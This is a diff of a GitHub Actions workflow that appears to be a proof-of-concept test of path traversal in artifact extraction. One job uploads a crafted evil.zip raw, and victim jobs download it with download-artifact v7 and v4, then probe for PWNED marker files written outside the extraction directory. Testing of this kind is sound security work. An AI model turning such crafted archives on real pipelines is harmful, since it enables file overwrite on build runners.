@@ -7,7 +7,7 @@ jobs:
   untrusted:
     runs-on: ubuntu-latest
     steps:
-      - name: build a crafted zip and upload it as a raw (unarchived) artifact
+      - name: build a crafted zip and upload it raw (archive: false) with v7
         run: |
           python3 - <<'PY'
           import zipfile
@@ -17,9 +17,8 @@ jobs:
               z.writestr("benign.txt", "benign artifact content\n")
           print("crafted evil.zip")
           PY
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v7
         with:
-          name: evil.zip
           path: evil.zip
           archive: false
 
@@ -28,17 +27,32 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: extract the artifact the untrusted job supplied
+      - name: extract with download-artifact v7
+        uses: actions/download-artifact@v7
+        with:
+          name: evil.zip
+          path: downloads-v7
+      - name: did the extraction escape (v7)
+        run: |
+          set +e
+          echo "--- v7 dir ---"; ls -la downloads-v7 2>&1 | head
+          echo "--- v7 outside probes ---"
+          cat "$GITHUB_WORKSPACE/PWNED-OUTSIDE.txt" 2>&1 || echo "PWNED-OUTSIDE(v7): absent"
+          cat /home/runner/PWNED-HOME.txt 2>&1 || echo "PWNED-HOME(v7): absent"
+  victim4:
+    needs: untrusted
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: extract with download-artifact v4
         uses: actions/download-artifact@v4
         with:
           name: evil.zip
-          path: downloads
-      - name: did the extraction escape its directory
+          path: downloads-v4
+      - name: did the extraction escape (v4)
         run: |
           set +e
-          echo "--- workspace root ---"; ls -la "$GITHUB_WORKSPACE" | head -20
-          echo "--- extraction dir ---"; ls -la downloads 2>&1 | head
-          echo "--- outside probe (workspace root) ---"
-          cat "$GITHUB_WORKSPACE/PWNED-OUTSIDE.txt" 2>&1 || echo "PWNED-OUTSIDE: absent"
-          echo "--- outside probe (runner home) ---"
-          cat /home/runner/PWNED-HOME.txt 2>&1 || echo "PWNED-HOME: absent"
+          echo "--- v4 dir ---"; ls -la downloads-v4 2>&1 | head
+          echo "--- v4 outside probes ---"
+          cat "$GITHUB_WORKSPACE/PWNED-OUTSIDE.txt" 2>&1 || echo "PWNED-OUTSIDE(v4): absent"
+          cat /home/runner/PWNED-HOME.txt 2>&1 || echo "PWNED-HOME(v4): absent"
